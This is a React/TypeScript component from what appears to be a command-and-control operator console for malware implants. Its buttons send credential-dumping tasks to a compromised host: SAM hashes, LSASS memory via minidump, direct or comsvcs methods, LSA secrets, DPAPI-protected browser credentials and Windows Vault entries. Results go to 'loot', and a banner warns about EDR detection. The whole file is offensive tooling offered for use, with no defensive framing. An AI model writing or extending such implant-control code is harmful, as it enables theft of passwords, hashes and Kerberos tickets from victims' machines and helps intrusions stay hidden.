import { useState } from 'react';
import { taskClient } from '../../api';

interface Props {
  sessionId: string;
}

function hexToUint8Array(hex: string): Uint8Array<ArrayBuffer> {
  const buffer = new ArrayBuffer(hex.length / 2);
  const bytes = new Uint8Array(buffer);
  for (let i = 0; i < hex.length; i += 2) {
    bytes[i / 2] = parseInt(hex.substr(i, 2), 16);
  }
  return bytes;
}

type LsassMethod = 'minidump' | 'direct' | 'comsvcs';

export function CredentialPanel({ sessionId }: Props) {
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [taskId, setTaskId] = useState<string | null>(null);
  const [activeOp, setActiveOp] = useState<string | null>(null);

  const [lsassMethod, setLsassMethod] = useState<LsassMethod>('minidump');
  const [dpapiUser, setDpapiUser] = useState('');

  const dispatch = async (op: string, subcommand: string) => {
    setLoading(true);
    setError(null);
    setTaskId(null);
    setActiveOp(op);
    try {
      const encoder = new TextEncoder();
      const taskData = encoder.encode(subcommand) as Uint8Array<ArrayBuffer>;

      const response = await taskClient.dispatchTask({
        implantId: { value: hexToUint8Array(sessionId) },
        taskType: 'creds',
        taskData,
      });

      const id = response.taskId
        ? Array.from(response.taskId.value).map(b => b.toString(16).padStart(2, '0')).join('')
        : '';
      setTaskId(id);
    } catch (err: any) {
      setError(err.message || 'Failed to dispatch task');
    } finally {
      setLoading(false);
    }
  };

  const handleSAM = () => dispatch('SAM Dump', 'sam');
  const handleLSASS = () => dispatch('LSASS Dump', `lsass\0${lsassMethod}`);
  const handleLSASecrets = () => dispatch('LSA Secrets', 'lsa_secrets');
  const handleDPAPI = () =>
    dispatch('DPAPI', dpapiUser.trim() ? `dpapi\0${dpapiUser.trim()}` : 'dpapi');
  const handleVault = () => dispatch('Vault', 'vault');

  return (
    <div className="p-4 space-y-5">
      <div className="flex items-center justify-between">
        <h3 className="text-ctp-text font-semibold text-sm uppercase tracking-wide">Credential Dump</h3>
      </div>

      <div className="px-3 py-2 rounded bg-ctp-surface0 border border-ctp-surface2 text-xs text-ctp-subtext0 italic">
        Credentials will be automatically stored in loot.
      </div>

      {/* SAM */}
      <div className="flex items-center justify-between py-2 border-b border-ctp-surface0">
        <div>
          <p className="text-sm text-ctp-text font-medium">SAM</p>
          <p className="text-xs text-ctp-subtext0">Local account hashes from registry</p>
        </div>
        <button
          onClick={handleSAM}
          disabled={loading}
          className="px-3 py-1.5 rounded text-sm font-medium bg-ctp-blue text-ctp-base hover:bg-ctp-blue/80 transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
        >
          Dump
        </button>
      </div>

      {/* LSASS */}
      <div className="space-y-2 pb-2 border-b border-ctp-surface0">
        <div className="px-3 py-2 rounded bg-ctp-red/20 text-ctp-red text-xs border border-ctp-red/30 font-medium">
          Warning: LSASS access is heavily monitored by EDR. High detection risk.
        </div>
        <div className="flex items-center justify-between">
          <div>
            <p className="text-sm text-ctp-text font-medium">LSASS</p>
            <p className="text-xs text-ctp-subtext0">Plaintext creds, hashes, Kerberos tickets</p>
          </div>
          <button
            onClick={handleLSASS}
            disabled={loading}
            className="px-3 py-1.5 rounded text-sm font-medium bg-ctp-red text-ctp-base hover:bg-ctp-red/80 transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
          >
            Dump
          </button>
        </div>
        <div className="flex items-center gap-2">
          <label className="text-xs text-ctp-subtext0 whitespace-nowrap">Method:</label>
          <select
            value={lsassMethod}
            onChange={e => setLsassMethod(e.target.value as LsassMethod)}
            className="px-2 py-1 rounded bg-ctp-surface0 border border-ctp-surface2 text-ctp-text text-xs focus:outline-none focus:border-ctp-mauve"
          >
            <option value="minidump">Minidump (default)</option>
            <option value="direct">Direct</option>
            <option value="comsvcs">Comsvcs</option>
          </select>
        </div>
      </div>

      {/* LSA Secrets */}
      <div className="flex items-center justify-between py-2 border-b border-ctp-surface0">
        <div>
          <p className="text-sm text-ctp-text font-medium">LSA Secrets</p>
          <p className="text-xs text-ctp-subtext0">Service account creds, cached domain creds</p>
        </div>
        <button
          onClick={handleLSASecrets}
          disabled={loading}
          className="px-3 py-1.5 rounded text-sm font-medium bg-ctp-blue text-ctp-base hover:bg-ctp-blue/80 transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
        >
          Dump
        </button>
      </div>

      {/* DPAPI */}
      <div className="space-y-2 pb-2 border-b border-ctp-surface0">
        <div className="flex items-center justify-between">
          <div>
            <p className="text-sm text-ctp-text font-medium">DPAPI</p>
            <p className="text-xs text-ctp-subtext0">Browser creds, certificates, secrets</p>
          </div>
          <button
            onClick={handleDPAPI}
            disabled={loading}
            className="px-3 py-1.5 rounded text-sm font-medium bg-ctp-blue text-ctp-base hover:bg-ctp-blue/80 transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
          >
            Dump
          </button>
        </div>
        <input
          type="text"
          value={dpapiUser}
          onChange={e => setDpapiUser(e.target.value)}
          placeholder="Target user (optional)"
          className="w-full px-3 py-1.5 rounded bg-ctp-surface0 border border-ctp-surface2 text-ctp-text text-sm placeholder-ctp-overlay0 focus:outline-none focus:border-ctp-blue"
        />
      </div>

      {/* Vault */}
      <div className="flex items-center justify-between py-2">
        <div>
          <p className="text-sm text-ctp-text font-medium">Windows Vault</p>
          <p className="text-xs text-ctp-subtext0">Credential Manager entries</p>
        </div>
        <button
          onClick={handleVault}
          disabled={loading}
          className="px-3 py-1.5 rounded text-sm font-medium bg-ctp-blue text-ctp-base hover:bg-ctp-blue/80 transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
        >
          Dump
        </button>
      </div>

      {error && (
        <div className="px-3 py-2 rounded bg-ctp-red/20 text-ctp-red text-sm border border-ctp-red/30">
          {error}
        </div>
      )}

      {taskId && (
        <div className="space-y-1">
          <div className="text-xs text-ctp-subtext0">
            Operation: <span className="text-ctp-text">{activeOp}</span>
            {loading && <span className="ml-2 text-ctp-yellow">Dispatching...</span>}
          </div>
          <div className="text-xs text-ctp-subtext0">
            Task ID: <span className="font-mono text-ctp-blue">{taskId}</span>
          </div>
        </div>
      )}
    </div>
  );
}
